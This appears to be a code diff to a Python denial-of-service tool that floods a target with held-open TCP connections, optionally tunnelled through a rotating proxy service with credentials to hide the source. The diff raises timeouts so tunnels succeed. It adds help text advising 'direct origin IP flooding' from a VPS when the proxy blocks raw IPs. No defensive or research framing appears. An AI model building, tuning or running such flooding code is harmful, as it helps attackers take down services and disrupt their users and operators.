@@ -43,7 +43,8 @@ def _connect_direct(target, port, hold):
 
 
 def _connect_proxy(ws_user, ws_pass, target, port, hold):
-    s = socket.create_connection((WS_HOST, WS_PORT), timeout=10)
+    s = socket.create_connection((WS_HOST, WS_PORT), timeout=15)
+    s.settimeout(30)  # give Webshare time to tunnel to target
     auth = base64.b64encode(f"{ws_user}:{ws_pass}".encode()).decode()
     req = (f"CONNECT {target}:{port} HTTP/1.1\r\n"
            f"Host: {target}:{port}\r\n"
@@ -58,6 +59,7 @@ def _connect_proxy(ws_user, ws_pass, target, port, hold):
     if b" 200 " not in buf:
         s.close()
         raise Exception(f"CONNECT rejected: {buf[:80].decode(errors='replace')}")
+    s.settimeout(hold + 10)
     time.sleep(hold)
     s.close()
 
@@ -110,7 +112,9 @@ def main():
     ap.add_argument("--rounds",      type=int, default=0,
                     help="rounds to run; 0 = infinite (default: 0)")
     ap.add_argument("--webshare",    action="store_true",
-                    help="tunnel via Webshare backbone rotating proxy")
+                    help="tunnel via Webshare backbone rotating proxy "
+                         "(NOTE: Webshare blocks CONNECT to raw IPs — use hostname targets only; "
+                         "for direct origin IP flooding, omit this flag and run from VPS)")
     args = ap.parse_args()
 
     ws_user = ws_pass = None
